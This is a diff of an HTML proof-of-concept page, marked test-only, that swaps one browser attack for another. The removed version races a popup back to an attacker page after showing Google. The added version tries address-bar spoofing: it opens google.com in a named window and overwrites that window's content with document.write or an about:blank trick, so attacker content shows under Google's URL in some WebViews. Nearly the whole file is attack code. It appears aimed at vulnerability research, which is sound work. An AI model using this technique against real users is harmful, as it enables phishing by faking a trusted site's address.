@@ -1,117 +1,63 @@
 <!doctype html>
 <html lang="id">
 <head>
-<meta charset="utf-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>PoC Try Back (TEST ONLY)</title>
-<style>
-  body{font-family:system-ui,sans-serif;padding:14px;background:#f6f8fb}
-  button{padding:8px 12px;border-radius:8px;border:0;background:#0b66ff;color:#fff;cursor:pointer}
-  #log{white-space:pre-wrap;background:#111;color:#e6f0ff;padding:10px;border-radius:8px;margin-top:10px;max-height:240px;overflow:auto}
-  label{margin-right:8px}
-</style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>PoC — Address Bar Race (TEST ONLY)</title>
+  <style>
+    html,body{height:100%;margin:0;display:flex;align-items:center;justify-content:center;background:#fff}
+    h1{font-family:system-ui,Segoe UI,Roboto,Arial;font-size:28px;color:#111}
+  </style>
 </head>
 <body>
-  <h3>PoC — Try programmatic BACK (TEST ONLY)</h3>
-  <div>
-    <label>delayOpen (ms): <input id="delayOpen" type="number" value="300" style="width:80px"></label>
-    <label>delayReturn (ms): <input id="delayReturn" type="number" value="1500" style="width:80px"></label>
-    <button id="run">Run</button>
-    <button id="abort">Abort</button>
-  </div>
-  <div id="log">LOG: ready</div>
+  <!-- Visible attacker content -->
+  <h1>This is not Google!</h1>
 
 <script>
-const runBtn = document.getElementById('run');
-const abortBtn = document.getElementById('abort');
-const logEl = document.getElementById('log');
+/*
+  PoC (best-effort):
+  1) try to open named window 'x' to https://www.google.com/
+  2) after a short delay, attempt to replace the content in that same window with attacker content
+     (document.write on the window we opened). Many browsers block this for cross-origin navigations,
+     but some WebView implementations / timing windows may allow the race that leads to address-bar mismatch.
+  3) fallback: try about:blank flow (open about:blank, write attacker content, then navigate to google).
+  NOTE: behavior depends on target WebView; run only in your test environment.
+*/
 
-let winRef = null;
-let timers = [];
-
-function log(msg){
-  const t = new Date().toISOString().slice(11,23);
-  logEl.textContent += `\n[${t}] ${msg}`;
-  logEl.scrollTop = logEl.scrollHeight;
-}
-
-function clearAll(){
-  timers.forEach(t=>clearTimeout(t));
-  timers = [];
-  try{ if (winRef && !winRef.closed) winRef.close(); } catch(e){}
-  winRef = null;
-}
-
-runBtn.addEventListener('click', () => {
-  clearAll();
-  log('=== START sequence (TEST ONLY) ===');
-  const delayOpen = Math.max(0, parseInt(document.getElementById('delayOpen').value||"300",10));
-  const delayReturn = Math.max(0, parseInt(document.getElementById('delayReturn').value||"1500",10));
-  const google = 'https://www.google.com/';
-  const attacker = 'https://mohammedalqi.github.io/';
-
+(function runPoC(){
+  const target = 'https://www.google.com/';
+  const attackerUrl = location.href; // our page
+  const openDelay = 300; // ms — adjust when testing
   try {
-    winRef = window.open(google, 'x'); // open google in named window 'x'
-    if (!winRef) { log('window.open returned null (popup blocked).'); return; }
-    log('opened Google in popup (name="x")');
-  } catch(e){
-    log('window.open error: ' + e);
-    return;
-  }
-
-  // open attacker in same window after delayOpen
-  timers.push(setTimeout(()=>{
-    try {
-      window.open(attacker, 'x'); // reuse same name
-      log(`after ${delayOpen}ms: opened attacker in same window (reuse 'x')`);
-    } catch(e){
-      log('open attacker error: ' + e);
-    }
-  }, delayOpen));
-
-  // after delayOpen + delayReturn try programmatic back; fallback to navigate, fallback to close
-  timers.push(setTimeout(()=>{
-    if (!winRef || winRef.closed) { log('target window not available (closed)'); return; }
-    log(`after ${delayOpen + delayReturn}ms: attempting winRef.history.back()`);
-    try {
-      // best-effort: may throw or be no-op depending on browser
-      winRef.history.back();
-      log('called winRef.history.back() (observe behavior on the opened window)');
-      // give it a short time to take effect; if nothing, fallback below after 300ms
-      timers.push(setTimeout(() => {
-        try {
-          // attempt to check if still same-origin by reading location (may throw)
-          let loc;
-          try { loc = winRef.location.href; log('post-back: winRef.location.href = ' + loc); }
-          catch(e){ log('post-back: cannot read winRef.location (cross-origin or blocked): ' + e); }
-
-          // If cross-origin read blocked, still fallback to navigation-to-attacker to force return
-          log('fallback: setting winRef.location.href = attacker (best-effort)');
-          try { winRef.location.href = attacker; log('set location.href to attacker'); }
-          catch(e){ log('setting location.href blocked: ' + e + ' — trying close()'); try { winRef.close(); log('closed window as last fallback'); } catch(e2){ log('close() failed: ' + e2); } }
-        } catch(e2){
-          log('unexpected error in fallback: ' + e2);
-        }
-      }, 300));
-    } catch(err){
-      log('history.back() threw/blocked: ' + err);
-      // fallback immediately: navigate to attacker
+    // Attempt 1: open google in named window then reuse name 'x' to inject afterwards
+    const w = window.open(target, 'x'); // requires popup permission / user gesture in many browsers
+    if (!w) return; // popup blocked or not allowed
+    setTimeout(() => {
       try {
-        winRef.location.href = attacker;
-        log('fallback: set winRef.location.href = attacker');
-      } catch(e){
-        log('fallback navigate blocked: ' + e + ' — trying close()');
-        try { winRef.close(); log('closed window as final fallback'); }
-        catch(e2){ log('final fallback close() failed: ' + e2); }
+        // Attempt to write attacker content into the same named window.
+        // This will throw if the navigation to google already committed or cross-origin protections apply.
+        w.document.open();
+        w.document.write('<!doctype html><meta charset="utf-8"><title>Not Google</title><style>body{font-family:system-ui;padding:32px}</style><h1>This is not Google!</h1>');
+        w.document.close();
+      } catch (e) {
+        // If blocked, try about:blank flow as a fallback (some WebViews behave differently)
+        try {
+          const w2 = window.open('about:blank', 'x');
+          if (!w2) return;
+          w2.document.open();
+          w2.document.write('<!doctype html><meta charset="utf-8"><title>Not Google</title><style>body{font-family:system-ui;padding:32px}</style><h1>This is not Google!</h1>');
+          w2.document.close();
+          // then navigate to target (this creates the race in some engines)
+          setTimeout(() => {
+            try { w2.location.href = target; } catch(e2) { /* ignore */ }
+          }, 50);
+        } catch(_) { /* ignore */ }
       }
-    }
-  }, delayOpen + delayReturn));
-});
-
-abortBtn.addEventListener('click', () => {
-  clearAll();
-  log('ABORTED: timers cleared and popup closed (if present)');
-});
+    }, openDelay);
+  } catch (err) {
+    // silent fail — PoC best-effort
+  }
+})();
 </script>
 </body>
 </html>
